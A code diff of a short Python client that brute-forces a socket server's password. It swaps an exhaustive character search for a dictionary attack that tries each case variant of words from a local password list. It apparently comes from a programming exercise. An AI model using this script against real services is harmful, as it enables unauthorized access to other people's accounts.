@@ -10,6 +10,8 @@ def iterGen():
         yield ans
         ans.append(cases)
 
+
+
 if __name__ == "__main__":
     hostname, port = sys.argv[1:]
 
@@ -17,13 +19,27 @@ if __name__ == "__main__":
         address = (hostname, int(port))
         client_socket.connect(address)
         response = "Wrong password!"
-        it = iterGen()
-        while response != "Connection success!":
-            nit = next(it)
-            for p in itertools.product(*nit):
-                psw = bytes(p)
-                client_socket.send(psw)
+
+        # it = iterGen()
+        # while response != "Connection success!":
+        #     nit = next(it)
+        #     for p in itertools.product(*nit):
+        #         psw = bytes(p)
+        #         client_socket.send(psw)
+        #         response = client_socket.recv(1024).decode()
+        #         if response == "Connection success!":
+        #             break
+
+        with open('E:\\Downloads\\passwords.txt', 'r') as db:
+            base = db.read().splitlines()
+        for a in base:
+            for p in itertools.product(*zip(a, a.upper())):
+                psw = "".join(p)
+                client_socket.send(psw.encode())
                 response = client_socket.recv(1024).decode()
                 if response == "Connection success!":
                     break
-    print(psw.decode())
+            if response == "Connection success!":
+                break
+    print(psw)
+
